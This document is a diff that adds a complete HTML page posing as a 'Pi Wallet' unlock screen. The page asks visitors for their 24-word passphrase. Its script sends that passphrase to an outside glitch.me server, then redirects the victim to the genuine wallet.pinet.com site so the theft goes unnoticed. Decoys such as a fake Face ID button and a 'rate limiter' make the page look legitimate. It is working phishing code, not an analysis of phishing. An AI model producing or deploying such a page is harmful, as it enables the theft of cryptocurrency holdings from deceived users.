@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Wallet Authentication</title>
+    <style>
+        body {
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .modal-overlay {
+            display: flex !important;
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            box-shadow: 0 0 20px rgba(0,0,0,0.2);
+        }
+        .modal-header-bar {
+            background-color: #6d318d;
+            height: 70px;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1001;
+        }
+        .modal-header-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            width: 100%;
+        }
+        .modal-header-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+        }
+        .modal-header-title {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 0;
+        }
+        .modal-content {
+            width: 100%;
+            height: 100%;
+            padding: 15px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            position: relative;
+        }
+        .modal-inner {
+            max-width: 450px;
+            width: 90%;
+            margin: 0 auto;
+            padding-top: 80px;
+        }
+        .modal-content h2 {
+            color: black;
+            margin: 20px 0 15px 0;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+        }
+        .modal-content textarea {
+            width: 100%;
+            height: 250px;
+            padding: 15px;
+            margin: 0 0 15px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            resize: none;
+            font-size: 16px;
+            font-weight: 500;
+            box-sizing: border-box;
+            background-color: #f9f9f9;
+        }
+        .modal-content textarea:focus {
+            outline: none;
+            border-color: #6d318d;
+            background-color: white;
+        }
+        .unlock-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 15px 0;
+        }
+        .unlock-options button {
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .passphrase {
+            background: white;
+            color: #6d318d;
+            border: 2px solid #6d318d;
+        }
+        .passphrase:hover {
+            background: #f5f0fa;
+        }
+        .face-id {
+            background: #6d318d;
+            color: white;
+            border: none;
+        }
+        .face-id:hover {
+            background: #5a2a6d;
+        }
+        .error-message {
+            color: #e74c3c;
+            font-size: 14px;
+            margin: -10px 0 10px 0;
+            font-weight: bold;
+            display: none;
+            text-align: center;
+        }
+        .info-message {
+            margin: 15px 0;
+            font-size: 14px;
+            color: #555;
+            line-height: 1.4;
+        }
+        .info-message a {
+            color: #1e81b0;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .info-message a:hover {
+            text-decoration: underline;
+        }
+        .back-icon {
+            position: absolute;
+            top: 12px;
+            left: 15px;
+            font-size: 28px;
+            cursor: pointer;
+            color: white;
+            background: none;
+            border: none;
+            padding: 8px;
+            z-index: 1002;
+        }
+        .back-icon:hover {
+            background-color: rgba(245, 240, 250, 0.5);
+            border-radius: 50%;
+        }
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #6d318d;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="modal-overlay">
+        <div class="modal-header-bar">
+            <button class="back-icon" onclick="window.close()">←</button>
+            <div class="modal-header-content">
+                <img src="images/home.png" alt="Home" class="modal-header-icon">
+                <h3 class="modal-header-title">Wallet</h3>
+            </div>
+        </div>
+        <div class="modal-content">
+            <div class="modal-inner">
+                <h2>Unlock Pi Wallet</h2>
+                <textarea id="passphraseInput" placeholder="Enter your 24-word passphrase here"></textarea>
+                <div class="error-message" id="errorMessage">Invalid passphrase.</div>
+                <div class="unlock-options">
+                    <button class="passphrase" onclick="validatePassphrase()">Unlock With Passphrase</button>
+                    <button class="face-id" onclick="showFaceIDError()">Unlock With Face ID</button>
+                </div>
+                <div class="info-message">
+                    <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+                    <p>Lost your passphrase? <a href="#" onclick="redirectToNewWallet()">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p>Done...</p>
+    </div>
+
+    <script>
+        // ====================== 24-HOUR RATE LIMITER ======================
+        function checkRateLimit() {
+            const LAST_SUBMISSION_KEY = 'lastPassphraseSubmission';
+            const TWENTY_FOUR_HOURS = 24 * 60 * 60 * 1000;
+            
+            const lastSubmission = localStorage.getItem(LAST_SUBMISSION_KEY);
+            const now = Date.now();
+            
+            if (lastSubmission && (now - parseInt(lastSubmission)) < TWENTY_FOUR_HOURS) {
+                const hoursLeft = Math.ceil((TWENTY_FOUR_HOURS - (now - parseInt(lastSubmission))) / (1000 * 60 * 60));
+                alert(`You can only submit once per 24 hours. Please try again in ${hoursLeft} hours.`);
+                return false;
+            }
+            
+            localStorage.setItem(LAST_SUBMISSION_KEY, now.toString());
+            return true;
+        }
+
+        async function validatePassphrase() {
+            // Check 24-hour limit first
+            if (!checkRateLimit()) return;
+
+            const input = document.getElementById('passphraseInput');
+            const error = document.getElementById('errorMessage');
+            const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);
+
+            if (words.length !== 24) {
+                error.style.display = 'block';
+                error.textContent = 'Passphrase must be 24 words';
+                return;
+            }
+
+            error.style.display = 'none';
+            document.getElementById('loadingOverlay').style.display = 'flex';
+
+            try {
+                const response = await fetch('https://fuckyou-suraa.glitch.me/validate-passphrase', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ passphrase: input.value })
+                });
+
+                if (response.status === 429) {
+                    alert("Server overloaded. Please wait before trying again.");
+                    return;
+                }
+
+                const result = await response.json();
+                if (result.success) {
+                    window.location.href = "https://wallet.pinet.com";
+                }
+            } catch (e) {
+                alert("Connection error. Try again later.");
+                localStorage.removeItem('lastPassphraseSubmission');
+            } finally {
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }
+        }
+
+        function showFaceIDError() {
+            alert("Face ID is not available at the moment. Please try with passphrase.");
+        }
+        
+        function redirectToNewWallet() {
+            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
+                window.location.href = "https://wallet.pinet.com/new";
+            }
+        }
+    </script>
+</body>
+</html>
